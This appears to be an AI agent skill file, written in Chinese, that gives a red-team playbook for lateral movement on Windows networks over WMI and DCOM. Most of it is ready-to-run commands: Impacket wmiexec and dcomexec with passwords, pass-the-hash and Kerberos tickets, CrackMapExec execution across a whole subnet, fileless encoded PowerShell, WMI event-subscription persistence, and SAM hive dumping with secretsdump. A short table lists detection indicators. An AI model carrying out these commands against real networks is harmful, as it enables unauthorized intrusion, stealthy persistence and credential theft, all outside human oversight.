---
name: cszh-performing-lateral-movement-with-wmiexec
description: 在红队演练中，使用基于 WMI 的远程执行技术（包括 Impacket wmiexec.py、CrackMapExec 和原生 WMI 命令）在 Windows 网络中执行横向移动，实现隐蔽的后渗透操作。
---

> 本技能源自中文网络安全技能库 killvxk/cybersecurity-skills-zh（上游目录 performing-lateral-movement-with-wmiexec），正文按中文原文照录。

**这个技能干什么**：在红队演练中，使用基于 WMI 的远程执行技术（包括 Impacket wmiexec.py、CrackMapExec 和原生 WMI 命令）在 Windows 网络中执行横向移动，实现隐蔽的后渗透操作。

**什么时候用**：需要按上游中文方法论执行「performing-lateral-movement-with-wmiexec」对应任务时加载本技能。

**关键工具**：见正文各章节列出的命令与工具清单。

# 使用 WMIExec 执行横向移动

## 概述

WMI（Windows Management Instrumentation，Windows 管理规范）是一个合法的 Windows 管理框架，红队将其滥用于横向移动，因为它能提供远程命令执行能力，而无需部署额外服务或留下如 PsExec 那样明显的痕迹。Impacket 的 wmiexec.py 通过 Win32_Process.Create 执行命令，并通过 ADMIN$ 共享上的临时文件读取输出，从而创建基于 WMI 的半交互式 Shell。与 PsExec 不同，WMIExec 不会在目标上安装服务，使其更为隐蔽，更不容易触发安全告警。基于 WMI 的横向移动对应 MITRE ATT&CK T1047（Windows Management Instrumentation），APT29、APT32 和 Lazarus Group 等威胁行为者均使用此技术。

## 目标

- 使用基于 WMI 的技术在 Windows 目标上执行远程命令
- 通过 Impacket wmiexec.py 建立半交互式 Shell
- 使用 WMI 进行哈希传递（Pass-the-Hash）横向移动
- 使用 CrackMapExec 对多个目标执行 WMI 命令
- 执行原生 PowerShell WMI 命令进行无文件横向移动
- 将 WMI 与凭据收割链接以实现全网络访问

## MITRE ATT&CK 映射

- **T1047** - Windows Management Instrumentation
- **T1021.003** - 远程服务：分布式组件对象模型（DCOM）
- **T1550.002** - 使用替代认证材料：哈希传递
- **T1059.001** - 命令和脚本解释器：PowerShell
- **T1570** - 横向工具传输

## 实施步骤

### 阶段一：使用 Impacket 的 WMIExec
1. 使用凭据建立半交互式 Shell：
   ```bash
   # 使用明文密码
   wmiexec.py domain.local/admin:'Password123'@10.10.10.50

   # 使用 NT 哈希（Pass-the-Hash）
   wmiexec.py -hashes :a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 domain.local/admin@10.10.10.50

   # 使用 Kerberos 票据
   export KRB5CCNAME=admin.ccache
   wmiexec.py -k -no-pass domain.local/admin@TARGET01.domain.local

   # 执行特定命令（非交互式）
   wmiexec.py domain.local/admin:'Password123'@10.10.10.50 "ipconfig /all"
   ```
2. 无输出文件方式执行命令（通过 DCOM 更隐蔽）：
   ```bash
   # 使用 dcomexec.py 作为替代（MMC20.Application DCOM 对象）
   dcomexec.py -object MMC20 domain.local/admin:'Password123'@10.10.10.50

   # 使用 ShellWindows DCOM 对象
   dcomexec.py -object ShellWindows domain.local/admin:'Password123'@10.10.10.50
   ```

### 阶段二：CrackMapExec 多目标执行
1. 跨多个目标执行命令：
   ```bash
   # 在子网上执行单条命令
   crackmapexec wmi 10.10.10.0/24 -u admin -p 'Password123' -x "whoami"

   # 使用哈希执行
   crackmapexec wmi 10.10.10.0/24 -u admin -H a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 -x "ipconfig"

   # 执行 PowerShell 命令
   crackmapexec wmi 10.10.10.0/24 -u admin -p 'Password123' -X "Get-Process"

   # 通过 WMI 检查本地管理员访问权限
   crackmapexec wmi 10.10.10.0/24 -u admin -p 'Password123'
   ```

### 阶段三：原生 WMI 命令（Windows）
1. 使用内置 Windows WMI 工具执行远程命令：
   ```powershell
   # 使用 wmic.exe（已弃用但仍可用）
   wmic /node:10.10.10.50 /user:domain\admin /password:Password123 process call create "cmd.exe /c whoami > C:\temp\out.txt"

   # 使用 PowerShell Invoke-WmiMethod
   $cred = Get-Credential
   Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 10.10.10.50 `
     -Credential $cred -ArgumentList "cmd.exe /c ipconfig > C:\temp\output.txt"

   # 使用 CIM 会话（WMI 的现代替代品）
   $session = New-CimSession -ComputerName 10.10.10.50 -Credential $cred
   Invoke-CimMethod -CimSession $session -ClassName Win32_Process `
     -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}
   ```
2. 通过 WMI 执行无文件 PowerShell：
   ```powershell
   # 远程执行 Base64 编码的 PowerShell 命令
   $cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process | Out-File C:\temp\procs.txt'))
   Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 10.10.10.50 `
     -Credential $cred -ArgumentList "powershell.exe -enc $cmd"
   ```

### 阶段四：基于 WMI 的持久化
1. 创建 WMI 事件订阅以实现持久化：
   ```powershell
   # 创建 WMI 事件订阅（每次登录时运行命令）
   $filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter `
     -Arguments @{Name="PersistFilter"; EventNamespace="root\cimv2";
                  QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

   $consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer `
     -Arguments @{Name="PersistConsumer"; CommandLineTemplate="cmd.exe /c <payload>"}

   Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding `
     -Arguments @{Filter=$filter; Consumer=$consumer}
   ```

### 阶段五：与凭据收割链接
1. 使用 WMI 进行远程凭据提取：
   ```bash
   # 通过 WMI + reg save 转储 SAM 哈希
   wmiexec.py domain.local/admin:'Password123'@10.10.10.50 "reg save HKLM\SAM C:\temp\sam && reg save HKLM\SYSTEM C:\temp\system"

   # 下载保存的注册表蜂巢文件
   smbclient.py domain.local/admin:'Password123'@10.10.10.50
   > get C:\temp\sam
   > get C:\temp\system

   # 从保存的蜂巢文件提取哈希
   secretsdump.py -sam sam -system system LOCAL
   ```

## 工具与资源

| 工具 | 用途 | 平台 |
|------|---------|----------|
| wmiexec.py | 半交互式 WMI Shell（Impacket） | Linux（Python） |
| dcomexec.py | 基于 DCOM 的远程执行（Impacket） | Linux（Python） |
| CrackMapExec | 多目标 WMI 执行 | Linux（Python） |
| wmic.exe | 原生 Windows WMI 命令行工具 | Windows |
| PowerShell CIM | 现代 WMI cmdlet | Windows |
| SharpWMI | .NET WMI 执行工具 | Windows（.NET） |

## WMI 执行方法比较

| 方法 | 是否创建服务 | 输出方式 | 隐蔽程度 |
|--------|----------------|---------------|---------------|
| wmiexec.py | 否 | ADMIN$ 上的临时文件 | 中 |
| dcomexec.py | 否 | ADMIN$ 上的临时文件 | 中高 |
| wmic.exe | 否 | 无（盲执行）或重定向 | 中 |
| PowerShell WMI | 否 | 无（盲执行）或重定向 | 高 |
| PsExec（对比） | 是 | 服务输出管道 | 低 |

## 检测特征

| 指标 | 检测方法 |
|-----------|-----------------|
| Win32_Process.Create WMI 调用 | 事件 4688（进程创建），WMI 父进程 |
| ADMIN$ 上的 WMI 临时输出文件 | 监控 ADMIN$ 共享上的临时文件 |
| 远程 WMI 连接（DCOM/135） | 监控到工作站的 DCOM 流量 |
| WmiPrvSE.exe 派生 cmd.exe/powershell.exe | EDR 进程树分析 |
| 事件 5857/5860/5861 | Microsoft-Windows-WMI-Activity 中的 WMI 活动日志 |

## 验证标准

- [ ] 已在远程目标上建立 WMIExec Shell
- [ ] 已通过 WMI 验证哈希传递执行
- [ ] 已通过 CrackMapExec WMI 执行多目标命令
- [ ] 已远程执行原生 PowerShell WMI 命令
- [ ] 已通过 WMI 执行链完成凭据收割
- [ ] 目标系统上无服务创建痕迹
- [ ] 已通过命令输出和截图记录证据
